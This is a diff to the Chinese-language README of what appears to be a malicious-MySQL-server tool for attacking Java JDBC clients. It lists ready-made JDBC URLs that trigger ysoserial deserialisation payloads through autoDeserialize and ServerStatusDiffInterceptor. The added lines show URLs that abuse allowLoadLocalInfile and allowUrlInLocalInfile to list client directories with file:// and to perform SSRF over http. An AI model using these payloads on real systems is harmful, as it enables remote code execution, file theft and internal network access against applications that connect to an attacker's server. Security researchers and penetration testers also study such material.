@@ -95,6 +95,12 @@ ysoserial_command:
 | 6.x      | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password |
 | >=5.1.11 | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password    |
 
+如果需要读文件, jdbc 支持使用 `file://` 列目录 (当然其他协议, 例如 http 来 SSRF 也是可以的), 但是需要在 `allowLoadLocalInfile` 为 true 之外, 额外指定 `allowUrlInLocalInfile` 为 true, 详情见[这里](https://github.com/mysql/mysql-connector-j/blob/dd61577595edad45c398af508cf91ad26fc4144f/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1877)  
+eg.
+* 列 `/` 目录, `jdbc:mysql://127.0.0.1:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
+* SSRF `http://127.0.0.1:25565`, `jdbc:mysql://127.0.0.1:3306/http%3A%2F%2F127.0.0.1:25565?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
+
+
 ## Ref
 
 jdbc 反序列化思路参考:  
